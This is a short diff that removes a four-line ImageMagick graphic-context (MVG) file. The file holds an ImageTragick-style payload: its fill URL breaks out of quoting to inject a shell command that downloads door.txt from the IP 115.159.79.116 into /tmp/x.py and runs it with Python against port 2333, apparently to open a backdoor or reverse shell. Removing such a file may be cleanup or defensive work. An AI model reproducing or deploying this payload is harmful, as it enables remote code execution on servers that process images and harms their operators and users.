@@ -1,4 +1,0 @@
-push graphic-context
-viewbox 0 0 640 480
-fill 'url(https://example.com/image.jpg"|wget http://115.159.79.116/door.txt -O /tmp/x.py && python /tmp/x.py 115.159.79.116 2333")'
-pop graphic-context
